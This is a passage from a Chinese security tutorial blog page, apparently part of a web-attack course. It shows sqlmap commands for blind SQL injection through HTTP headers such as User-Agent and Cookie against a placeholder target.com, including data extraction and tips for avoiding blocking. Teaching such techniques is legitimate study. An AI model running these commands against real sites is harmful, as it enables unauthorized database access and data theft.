+<p><strong>修改后的 request.txt</strong> （关键：<code>User-Agent: *</code>）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/log.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">target.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">https://target.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=abc123</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>检测命令</strong> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -r 指定请求文件，-p 指定注入点（对应*的位置），--risk 2 提高检测强度，--level 3 检测更多HTTP头</span>
+</span></span><span class="line"><span class="cl">sqlmap -r request.txt -p User-Agent --risk <span class="m">2</span> --level <span class="m">3</span> --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>针对 Cookie/Referer/X-Forwarded-For 等其他头</strong></p>
+<p>只需将<code>*</code>标记到对应头部字段即可，示例：</p>
+<ul>
+<li>Cookie 注入：<code>Cookie: PHPSESSID=*</code></li>
+<li>X-Forwarded-For 注入：<code>X-Forwarded-For: *</code></li>
+<li>Referer 注入：<code>Referer: *</code></li>
+</ul>
+<hr>
+<p>如果 sqlmap 未自动识别盲注类型，可手动指定布尔盲注（B）或时间盲注（T）：</p>
+<h4 id="布尔盲注最常用">布尔盲注（最常用）
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># --technique B 指定布尔盲注，--dbms 指定数据库类型（如MySQL），-v 1 显示基础日志</span>
+</span></span><span class="line"><span class="cl">sqlmap -r request.txt -p User-Agent --technique B --dbms MySQL --batch -v <span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="时间盲注无页面响应差异时">时间盲注（无页面响应差异时）
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># --technique T 指定时间盲注，--delay 2 设置每次请求延迟2秒（避免误判），--time-sec 5 设置sleep时间5秒</span>
+</span></span><span class="line"><span class="cl">sqlmap -r request.txt -p User-Agent --technique T --delay <span class="m">2</span> --time-sec <span class="m">5</span> --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="提取数据">提取数据
+</h4><p>确认存在漏洞后，可通过在下面的基础命令上添加之前学习的参数提取数据库、表、字段、数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -r request.txt -p User-Agent
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>针对盲注速度慢的问题，可添加以下参数优化：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"># --threads 5 开启5线程（不要太高，避免被拦截），--charset &#34;0-9a-z&#34; 指定字符集缩小猜测范围
+</span></span><span class="line"><span class="cl"># --binary-hex 用16进制提取数据，避免字符编码问题，--smart 智能检测减少无效请求
+</span></span><span class="line"><span class="cl">sqlmap -r request.txt -p User-Agent --technique T --threads 5 --charset &#34;0-9a-z&#34; --binary-hex --smart --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+<div class="math-katex"></div>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.22.SP 奇技淫巧：SQL注入之数据外带</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.21 Webshell 免杀和正则表达式</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.19 XSS 注入攻击2与文件上传</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.18-xss%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.18 XSS注入攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.17-%E9%A1%B5%E6%B8%B8%E4%BD%9C%E5%BC%8A%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.17 页游作弊和信息搜集</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        <div class="comment-container mt-8"></div>
+        
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="makabaka11/makabaka11.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Retr0
+    </section>
+    
+    <section class="running-time">
+    已存在于互联网
+    <span id="runningdays" class="running-days"></span>
+    </section>
+    
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        发表了98篇文章 · 
+        总计139.79k字
+    </section>
+
+
+    <section class="powerby">
+        
+            Powered by ctOS <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+
+                <script src="/js/APlayer.min.js"></script>
+                <script src="/js/Meting.min.js"></script>
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eaf1211e4c7db355f37ceea53df13700e1b77fbcc3cfe8c1c1f69e4468a752e1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<link rel="stylesheet" href="/css/custom.css">
+
+<script>
+(function () {
+    const url = new URL(window.location.href);
+
+    
+    if (url.searchParams.has('utterances')) {
+
+        
+        
+        window.location.replace(window.location.pathname);
+    }
+})();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<script>
+    var pjax = new Pjax({
+        selectors: [".main-container"]
+    });
+</script>
+
+
+<script src=https://www.retr0.xyz/js/topbar.min.js></script>
+
+
+
+<script>
+function initUtterances() {
+    const isArticle = document.querySelector('.article-page') && document.querySelector('.article-content');
+    if (!isArticle) return;
+
+    const oldScript = document.querySelector('script[src^="https://utteranc.es/client.js"]');
+    if (oldScript) oldScript.remove();
+
+    const container = document.querySelector('.comment-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    let script = document.createElement('script');
+    script.src = 'https://utteranc.es/client.js';
+    script.setAttribute('repo', 'makabaka11/makabaka11.github.io');
+    script.setAttribute('issue-term', 'pathname');
+    script.setAttribute('crossorigin', 'anonymous');
+    script.async = true;
+    container.appendChild(script);
+}
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    if (!window.pjax || !window.pjax.state) initUtterances();
+});
+</script>
+
+
+<script>
+pjax._handleResponse = pjax.handleResponse;
+pjax.handleResponse = function(responseText, request, href, options) {
+    if (request.responseText.match("<html")) {
+        if (responseText) {
+            let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+            document.body.setAttribute("class", newDom.body.className);
+        }
+        pjax._handleResponse(responseText, request, href, options);
+    }
+};
+</script>
+
+
+<script>
+topbar.config({
+    barColors: {
+        '0': 'rgba(255, 255, 255, 1)',
+        '1.0': 'rgba(255, 183, 197, 1)'
+    }
+});
+
+document.addEventListener('pjax:send', () => topbar.show());
+
+document.addEventListener('pjax:complete', () => {
+    window.Stack.init();
+    topbar.hide();
+    setTimeout(initUtterances, 0);
+    updateViewCount();
+    renderKaTeX();
+    initPhotoSwipeFromDOM('.article-content');   
+    initLive2D();                                
+});
+</script>
+
+
+<script>
+function updateViewCount() {
+    const viewCountEl = document.getElementById('vercount_value_page_pv');
+    if (!viewCountEl) return;
+
+    viewCountEl.textContent = 'loading...';
+    const url = 'https://cn.vercount.one/js';
+
+    const old = document.querySelector(`script[src="${url}"]`);
+    if (old) old.remove();
+
+    const s = document.createElement('script');
+    s.src = url;
+    s.defer = true;
+    document.head.appendChild(s);
+
+    showHideView();
+}
+
+function showHideView() {
+    const viewCounts = document.querySelectorAll("#viewCount");
+    const isArticle = document.querySelector(".article-page");
+    viewCounts.forEach(ele => ele.style.display = isArticle ? 'block' : 'none');
+}
+</script>
+
+<script>
+    function showHideView() {
+        
+        let viewCounts = document.querySelectorAll("#viewCount");
+        if (viewCounts) {
+            
+            let article =  document.querySelector(".article-page");
+            if (!article) {
+                viewCounts.forEach(ele => {
+                    ele.style.display = 'none';
+                });
+            }
+        }
+    }
+    
+    showHideView();
+</script>
+
+
+
+<script>
+async function renderKaTeX() {
+    let katex = document.querySelector(".math-katex");
+    if (!katex) return;
+
+    while (typeof renderMathInElement !== 'function') {
+        await new Promise(r => setTimeout(r, 500));
+    }
+
+    const content = document.querySelector('.article-content') || document.body;
+    renderMathInElement(content, {
+        delimiters: [
+            { left: "$$", right: "$$", display: true },
+            { left: "$", right: "$", display: false },
+            { left: "\\(", right: "\\)", display: false },
+            { left: "\\[", right: "\\]", display: true }
+        ],
+        ignoredClasses: ["gist"]
+    });
+}
+</script>
+
+
+<div id="particles-js"></div>
+
+<script src=https://www.retr0.xyz/background/particles.min.js></script>
+<script>
+particlesJS.load('particles-js',
+    "https://www.retr0.xyz/background/particlesjs-config.json",
+    () => console.log('particles.js loaded')
+);
+</script>
+
+<style>
+#particles-js {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    z-index: -1;
+}
+</style>
+
+<script>
+
+function initPhotoSwipeFromDOM(selector) {
+    if (!window.PhotoSwipe) return;
+
+    const containers = document.querySelectorAll(selector);
+    if (!containers.length) return;
+
+    containers.forEach(container => {
+        const images = container.querySelectorAll('img');
+
+        images.forEach((img, index) => {
+
+            
+            function getImageSize() {
+                return new Promise(resolve => {
+                    if (img.complete && img.naturalWidth) {
+                        resolve({
+                            w: img.naturalWidth,
+                            h: img.naturalHeight
+                        });
+                    } else {
+                        const tmp = new Image();
+                        tmp.src = img.src || img.getAttribute("data-src");
+                        tmp.onload = () => resolve({ w: tmp.width, h: tmp.height });
+                    }
+                });
+            }
+
+            img.style.cursor = "zoom-in";
+
+            
+            img.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const size = await getImageSize();
+                const pswpEl = document.querySelector('.pswp');
+
+                const items = Array.from(images).map(i => ({
+                    src: i.src || i.getAttribute("data-src"),
+                    msrc: i.src,
+                    w: i.naturalWidth || 800,
+                    h: i.naturalHeight || 600,
+                }));
+
+                items[index].w = size.w;
+                items[index].h = size.h;
+
+                const gallery = new PhotoSwipe(pswpEl, PhotoSwipeUI_Default, items, {
+                    index,
+                    history: false
+                });
+
+                
+                
+                
+                enablePhotoSwipeWebShare(gallery);
+
+                gallery.init();
+            });
+        });
+    });
+}
+
+
+
+
+
+function enablePhotoSwipeWebShare(gallery) {
+    gallery.listen('shareLinkClick', function(shareButtonData, e) {
+        e.preventDefault();
+
+        const item = gallery.currItem;
+
+        if (navigator.share) {
+            navigator.share({
+                title: document.title,
+                text: '给你分享一张图片：',
+                url: item.src
+            }).catch(err => console.log("分享失败：", err));
+
+            return false; 
+        }
+
+        
+        return true;
+    });
+}
+</script>
+
+
+
+<script>
+
+
+window._live2d_loaded = window._live2d_loaded || false;
+window._live2d_initialized = window._live2d_initialized || false;
+
+
+function loadLive2DAssetsOnce(cdnPath) {
+    if (window._live2d_loaded) return Promise.resolve();
+
+    window._live2d_loaded = true;
+
+    return Promise.all([
+        loadRes(cdnPath + "waifu.css", "css"),
+        loadRes(cdnPath + "Core/live2dcubismcore.js", "js"),
+        loadRes(cdnPath + "live2d-sdk.js", "js"),
+        loadRes(cdnPath + "waifu-tips.js", "js")
+    ]);
+}
+
+
+function initLive2DWidgetOnce(cdnPath) {
+
+    if (window._live2d_initialized) return;
+
+    
+    const old = document.querySelector("#waifu");
+    if (old) old.remove();
+
+    window._live2d_initialized = true;
+
+    initWidget({
+        waifuPath: cdnPath + "waifu-tips.json",
+        cdnPath: cdnPath + "Resources/",
+        tools: ["hitokoto", "asteroids", "express", "switch-model", "switch-texture", "photo", "info", "quit"],
+        dragEnable: true,
+        dragDirection: ["x", "y"],
+        switchType: "order"
+    });
+
+    console.log("[Live2D] Widget initialized.");
+}
+
+
+function loadRes(url, type) {
+    return new Promise((resolve) => {
+        let tag;
+        if (type === "css") {
+            tag = document.createElement("link");
+            tag.rel = "stylesheet";
+            tag.href = url;
+        } else {
+            tag = document.createElement("script");
+            tag.src = url;
+        }
+        tag.onload = resolve;
+        document.head.appendChild(tag);
+    });
+}
+
+
+function initLive2D() {
+    if (screen.width < 768) return;
+
+    const cdnPath = "https://www.retr0.xyz/blog-live2d/";
+
+    loadLive2DAssetsOnce(cdnPath)
+        .then(() => initLive2DWidgetOnce(cdnPath));
+}
+
+initLive2D();  
+
+
+document.addEventListener("pjax:complete", () => {
+    initLive2D(); 
+});
+</script>
+
+
+<style>
+    .highlight {
+         
+        max-height: 400px;
+        overflow: hidden;
+        position: relative;  
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      const existingBox = codeBlock.querySelector('.code-more-box');
+      if (existingBox) existingBox.remove();
+
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://www.retr0.xyz/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+  
+  initCodeMoreBox();
+  
+  
+  document.addEventListener('pjax:complete', () => {
+    initCodeMoreBox();
+  });
+</script>
+
+
+<script>
+
+
+window.__articlePlayers = window.__articlePlayers || [];
+
+
+
+function getGlobalMetingPlayer() {
+    return window.__globalMetingPlayer || null;
+}
+
+
+
+function pauseGlobalMeting() {
+    const p = getGlobalMetingPlayer();
+    if (p && !p.audio.paused) {
+        p.pause();
+        console.log('[APlayer] Pause global Meting');
+    }
+}
+
+
+
+function pauseArticlePlayers() {
+    window.__articlePlayers.forEach(p => {
+        if (p && !p.audio.paused) {
+            p.pause();
+        }
+    });
+}
+
+
+
+function initAPlayers() {
+    if (typeof APlayer === "undefined") return;
+
+    document.querySelectorAll('.aplayer-article').forEach(el => {
+        if (el.dataset.loaded === "true") return;
+        el.dataset.loaded = "true";
+
+        const ap = new APlayer({
+            container: el,
+            fixed: false,
+            autoplay: false,
+            loop: 'none',
+            order: 'list',
+            preload: 'metadata',
+            volume: 0.7,
+            mutex: false, 
+            audio: [{
+                name: el.dataset.title || 'Unknown',
+                artist: el.dataset.artist || '',
+                url: el.dataset.src,
+                cover: el.dataset.cover || ''
+            }]
+        });
+
+        
+        ap.on('play', () => {
+            
+            pauseGlobalMeting();
+
+            
+            window.__articlePlayers.forEach(other => {
+                if (other !== ap && !other.audio.paused) {
+                    other.pause();
+                }
+            });
+
+    console.log('[APlayer] Switch article track');
+});
+
+
+        window.__articlePlayers.push(ap);
+    });
+}
+
+
+
+function bindMetingMutex() {
+    const p = getGlobalMetingPlayer();
+    if (!p || p.__mutexBound) return;
+
+    p.__mutexBound = true;
+
+    
+    p.on('play', () => {
+        pauseArticlePlayers();
+    });
+
+    console.log('[Meting] Mutex bound');
+}
+
+
+
+function initAllPlayers() {
+    initAPlayers();
+    bindMetingMutex();
+}
+
+
+
+document.addEventListener("DOMContentLoaded", initAllPlayers);
+document.addEventListener("pjax:complete", initAllPlayers);
+</script>
+
+<script>
+
+
+function destroyArticlePlayers() {
+    if (!window.__articlePlayers || window.__articlePlayers.length === 0) return;
+
+    window.__articlePlayers.forEach(ap => {
+        try {
+            if (!ap.audio.paused) {
+                ap.pause();
+            }
+            ap.destroy(); 
+        } catch (e) {
+            console.warn('[APlayer] destroy failed', e);
+        }
+    });
+
+    window.__articlePlayers = [];
+    console.log('[APlayer] Article players destroyed');
+}
+
+
+
+document.addEventListener('pjax:send', () => {
+    destroyArticlePlayers();
+});
+</script>
+
+
+<script>
+let runningTimeTimer = null;
+
+function updateRunningTime() {
+    const el = document.getElementById('runningdays');
+    if (!el) return;
+
+    let start = '2025-10-26 00:00:00'; 
+    start = new Date(start.replace(/-/g, "/"));
+    const now = new Date();
+
+    const diff = Math.floor((now.getTime() - start.getTime()) / 1000);
+
+    const days = Math.floor(diff / (24 * 3600));
+    const hours = Math.floor((diff % (24 * 3600)) / 3600);
+    const minutes = Math.floor((diff % 3600) / 60);
+    const seconds = diff % 60;
+
+    el.textContent =
+        `${days}天${hours}小时${minutes}分钟${seconds}秒`;
+}
+
+function initRunningTime() {
+    
+    updateRunningTime();
+
+    
+    if (runningTimeTimer) {
+        clearInterval(runningTimeTimer);
+    }
+
+    runningTimeTimer = setInterval(updateRunningTime, 1000);
+}
+
+ 
+document.addEventListener('DOMContentLoaded', () => {
+    initRunningTime();
+});
+
+ 
+document.addEventListener('pjax:complete', () => {
+    initRunningTime();
+});
+</script>
+
+
+
+
+
+
+
+
+
+        
+
+
+<meting-js
+  id="14477349320"
+  server="netease"
+  type="playlist"
+  fixed="true"
+  bottom="20px"
+  right="20px"
+  autoplay="false"
+  width="300px"
+  preload="metadata"
+  mutex="false">
+</meting-js>
+
+<script>
+(function () {
+
+  
+  if (window.__global_meting_initialized) return;
+  window.__global_meting_initialized = true;
+
+  const STORAGE_KEY = "playInfo";
+  const PLAYLIST_ID = "14477349320";
+
+  function initGlobalMeting() {
+    const meting = document.querySelector('meting-js');
+    if (!meting) return;
+
+    
+    meting.addEventListener('aplayer-loaded', () => {
+      const ap = meting.aplayer;
+      if (!ap) return;
+
+      
+      window.__globalMetingPlayer = ap;
+      console.log('[Meting] Global APlayer ready');
+
+      bindPlayerEvents(ap);
+      restorePlayState(ap);
+    }, { once: true });
+  }
+
+  function bindPlayerEvents(ap) {
+    
+    const save = () => savePlayState(ap);
+
+    window.addEventListener('beforeunload', save);
+    document.addEventListener('visibilitychange', save);
+
+    
+    ap.on('play', () => {
+      document.dispatchEvent(new CustomEvent('global-player-play'));
+    });
+  }
+
+  function savePlayState(ap) {
+    if (!ap || !ap.list || !ap.audio) return;
+
+    const data = {
+      playlistId: PLAYLIST_ID,
+      index: ap.list.index,
+      currentTime: ap.audio.currentTime,
+      paused: ap.paused
+    };
+
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+  }
+
+  function restorePlayState(ap) {
+    const data = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (!data || data.playlistId !== PLAYLIST_ID) return;
+
+    if (data.index < ap.list.songs.length) {
+      ap.list.switch(data.index);
+      ap.once('canplay', () => {
+        ap.seek(data.currentTime || 0);
+        if (!data.paused) {
+          ap.play().catch(() => {
+            ap.notice("点击继续播放", 3000);
+          });
+        }
+      });
+    }
+  }
+
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGlobalMeting);
+  } else {
+    initGlobalMeting();
+  }
+
+})();
+</script>
+
+    </body>
+</html>
